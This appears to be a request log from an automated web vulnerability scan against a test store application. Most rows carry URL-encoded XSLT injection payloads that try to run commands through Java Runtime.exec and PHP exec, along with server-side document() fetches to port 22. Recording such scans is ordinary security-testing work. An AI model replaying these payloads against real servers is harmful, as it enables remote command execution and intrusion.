5670,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,531,429,1101
5671,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,517,429,1033
5672,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,653,429,1036
5673,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,522,428,282
5674,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,522,428,373
5675,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,512,429,1100
5676,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,550,429,1100
5677,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,513,429,1101
5678,Mon Sep 07 03:12:56 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,869,429,1033
5679,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3C,200,OK,534,429,1100
5680,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3C,200,OK,534,429,1100
5681,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3C,200,OK,534,429,1100
5682,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3C,200,OK,534,429,1102
5683,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,552,429,1100
5684,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3C,200,OK,519,429,1100
5685,Mon Sep 07 03:12:57 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3C,200,OK,514,429,1100
5686,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,497,429,1100
5687,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,520,429,1100
5688,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,504,429,1102
5689,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,504,429,1100
5690,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3C,200,OK,514,429,1100
5691,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,530,429,1100
5692,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,879,429,1033
5693,Mon Sep 07 03:12:58 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,532,429,1100
5694,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,516,429,1100
5695,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1102
5696,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,533,429,1100
5697,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:12:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1100
5698,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,536,429,1100
5699,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,521,429,1100
5700,Mon Sep 07 03:12:59 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3C,200,OK,507,429,1100
5701,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,524,429,1100
5702,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,520,429,1100
5703,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,502,429,1102
5704,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,533,429,1100
5705,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,550,429,1100
5706,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,501,429,1100
5707,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,533,429,1100
5708,Mon Sep 07 03:13:00 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,502,429,1100
5709,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1100
5710,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,484,429,1100
5711,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,535,429,1100
5712,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:01 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,535,429,1102
5713,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,503,429,1100
5714,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,566,429,1100
5715,Mon Sep 07 03:13:01 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,550,429,1100
5716,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,532,429,1100
5717,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,542,429,1100
5718,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,492,429,1100
5719,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,492,429,1102
5720,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,522,429,1100
5721,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1100
5722,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,513,429,1100
5723,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,526,429,1100
5724,Mon Sep 07 03:13:02 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,1051,429,1100
5725,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,509,429,1100
5726,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,509,429,1100
5727,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,525,429,1100
5728,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,525,429,1102
5729,Mon Sep 07 03:13:03 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,518,429,1100
5730,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,523,429,1100
5731,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,570,429,1100
5732,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,529,429,1100
5733,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,538,429,1100
5734,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,503,429,1100
5735,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,502,429,1100
5736,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,518,429,1102
5737,Mon Sep 07 03:13:04 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,524,429,1100
5738,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,508,429,1100
5739,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,541,429,1100
5740,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,523,429,1100
5741,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,538,429,1100
5742,Mon Sep 07 03:13:05 BDT 2026,Mon Sep 07 03:13:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,534,429,1100
5743,Mon Sep 07 03:13:06 BDT 2026,Mon Sep 07 03:13:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,530,429,1100
5744,Mon Sep 07 03:13:07 BDT 2026,Mon Sep 07 03:13:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,558,429,1100
5745,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,GET,http://tfctest-002-production.up.railway.app/?_rsc=tXyZJ52UQVBCVsD3,301,Moved Permanently,157,212,0
5746,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,POST,http://tfctest-002-production.up.railway.app/admin,301,Moved Permanently,172,190,0
5747,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,POST,http://tfctest-002-production.up.railway.app/admin,301,Moved Permanently,194,190,0
5748,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,POST,http://tfctest-002-production.up.railway.app/admin,301,Moved Permanently,209,190,0
5749,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,POST,http://tfctest-002-production.up.railway.app/admin,301,Moved Permanently,203,190,0
5750,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,POST,http://tfctest-002-production.up.railway.app/login,301,Moved Permanently,203,190,0
5751,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,POST,http://tfctest-002-production.up.railway.app/admin,301,Moved Permanently,188,190,0
5752,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:08 BDT 2026,GET,http://tfctest-002-production.up.railway.app/,301,Moved Permanently,201,190,0
5753,Mon Sep 07 03:13:08 BDT 2026,Mon Sep 07 03:13:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,886,534,49517
5754,Mon Sep 07 03:13:09 BDT 2026,Mon Sep 07 03:13:09 BDT 2026,GET,http://tfctest-002-production.up.railway.app,301,Moved Permanently,94,190,0
5755,Mon Sep 07 03:13:09 BDT 2026,Mon Sep 07 03:13:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,502,361,9
5756,Mon Sep 07 03:13:09 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,518,361,9
5757,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,541,361,9
5758,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/0xdco9mmgmhww.js,301,Moved Permanently,110,226,0
5759,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/0y6b-yna2675q.css,301,Moved Permanently,110,227,0
5760,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/2c7gsw4ap3uid.js,301,Moved Permanently,180,226,0
5761,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/27fflktuso3nl.js,301,Moved Permanently,196,226,0
5762,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/1c6aptmytnu6q.js,301,Moved Permanently,180,226,0
5763,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:10 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/0ay527mnq1105.js,301,Moved Permanently,190,226,0
5764,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:11 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/12i08o1rdb-oz.js,301,Moved Permanently,173,226,0
5765,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:11 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/1-1_l2rr1q4ex.js,301,Moved Permanently,158,226,0
5766,Mon Sep 07 03:13:10 BDT 2026,Mon Sep 07 03:13:11 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/310vm2bl3xxpt.js,301,Moved Permanently,87,226,0
5767,Mon Sep 07 03:13:11 BDT 2026,Mon Sep 07 03:13:11 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/3-xpmlk5hluyb.js,301,Moved Permanently,95,226,0
5768,Mon Sep 07 03:13:11 BDT 2026,Mon Sep 07 03:13:11 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/3_mt4ape1jph7.js,301,Moved Permanently,94,226,0
5769,Mon Sep 07 03:13:11 BDT 2026,Mon Sep 07 03:13:11 BDT 2026,GET,http://tfctest-002-production.up.railway.app/_next/static/chunks/42pn8sqj_83y5.js,301,Moved Permanently,94,226,0
